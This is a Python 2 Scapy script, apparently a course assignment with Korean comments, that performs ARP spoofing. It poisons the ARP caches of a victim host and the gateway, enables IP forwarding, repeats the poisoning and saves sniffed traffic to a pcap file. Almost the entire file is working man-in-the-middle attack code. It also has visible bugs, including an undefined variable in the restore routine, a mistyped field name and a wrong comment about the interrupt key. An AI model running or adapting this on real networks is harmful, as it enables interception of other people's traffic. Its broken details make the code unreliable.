# -*- encoding: utf-8 -*-

import os
import sys
import netifaces
import time
from scapy.all import*


print "[bob5][포렌식]arp_poison[정소연]\n"


'''
[프로그램 기능]
sender가 ARP recover가 되었다고 판단되는 경우 ARP infection packet을 다시 보내 infection 상태를 유지시킨다.
sender로부터 spoofed IP packet이 수신되는 경우 attacker는 원래 가야 할 곳으로 relay를 시켜 준다.
attacker는 주기적으로(대략 1초) ARP infection packet을 sender에게 보낸다.

[절차]
1. victim(sender) > gateway(target) IP packet을 잡을 수 있도록 구현할 것.

2. 1번이 구현되었다면 반대 ARP spoofing session(gateway > victim)도 추가해 볼 것.

3. 2번까지 되었다면 ARP spoofinng session을 여러개 처리할 수 있도록 해 볼 것.

(2, 3번은 반드시 하지 않아도 됨. option임)

'''



# get the MAC address from IP 
def IPtoMAC_trans(IP):
	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=1, retry=2)
	for s, r in ans:
		return r[Ether].src
	return None



# spoofing by sending arp reply/request message
def Spoof(gatewayIP, victimIP):
	victimMAC = IPtoMAC_trans(victimIP)
	gatewayMAC = IPtoMAC_trans(gatewayIP)

	'''
	 op = 1 : request   op = 2 : reply
	 the attacker is placed in the middle of victim and gateway
	 by telling the victim(dst) that the packet is from the gateway(src)
	 and by telling the gateway(dst) that the packet is from the victim(src)
	 both with ARP replying message
	
	pdst: 목적지IP  /  psrc: 출발지IP
	hwdst: 목적지MAC  /  hwsrc: 목적지MAC
	'''
	
	# ARP REPLY: gateway(target) > victim(sender)
	send(ARP(op = 2, psrc = gatewayIP, pdst = victimIP, hwdst = victimMAC ))
	
	# ARP REPLY: victim(sender) > gateway(target)
	send(ARP(op = 2, psrc = victimIP, pdst = gatewayIP, hwdst = gatewayMAC))	
	
	
	print "  [complete] arp spoofing\n"



# restore the victim and router	
def Restore(gatewayIP, victimIP):
	victimMAC = IPtoMAC_trans(victimIP)
	gatewayMAC = IPtoMAC_trans(gatewayIP)
	
	# setting hwdst as "ff:ff:ff:ff:ff:ff" in arp message so that it can be recognized as a broadcast
	send(ARP(op =2, psrc = victimIP, pdst = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMac), count = 2)
	send(ARP(op =2, psrc = gatewayIP, pdst = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 2)




# sniff the packets go by
def Sniffer(victimIP, attackerIP):
	pkts = sniff(iface = interface, filter = "icmp", prn = lambda x:x.sprintf(" Source: %IP.src% , %Ether.src%\n Receiver: %IP.dst% , %Ether.dsc% \n\n"))
	
	# save it as a .pcap file for later analysis
	wrpcap("/tmp/temp.pcap", pkts)



def main():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	
	while 1:
		try:
			# execute ARP spoofinng session continuously
			Spoof(gatewayIP, victimIP)
			time.sleep(1)
			
			# packet sniffing
			Sniffer(victimIP, attackerIP)
			
			packet = rdpcap("/tmp/temp.pcap")
			packet.show()


		# for restoring, hit < Ctrl + z >
		except KeyboardInterrupt:
			Restore(gatewayIP, victimIP)
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
			sys.exit(1)
			

print "IP address of victim:"
victimIP = raw_input() # victimIP = "192.168.231.132"

# get info of interface
iface_temp = get_if_list()
interface = iface_temp[0]

print "   [Interface] ", interface



# get info of gatewayIP & gatewayMAC
gatewayIP_temp = netifaces.gateways()
gatewayIP = gatewayIP_temp['default'][netifaces.AF_INET][0]
gatewayMAC = IPtoMAC_trans(gatewayIP)

print "   [gatewayIP] ", gatewayIP
print "   [gatewayMAC] ", gatewayMAC


	
# get info of attackerIP & attackerMAC
attackerIP = sr1(IP(dst="8.8.8.8")/ICMP()).dst
attackerMAC_temp = [get_if_hwaddr(i) for i in get_if_list()]
attackerMAC = attackerMAC_temp[0]

print "   [attackerIP] ",attackerIP
print "   [attackerMAC] ", attackerMAC



# get info of victimIP & victimMAC
victimMAC = IPtoMAC_trans(victimIP)

print "   [victimIP] ", victimIP
print "   [victimMAC] ", victimMAC 



if __name__ == "__main__":
	main()

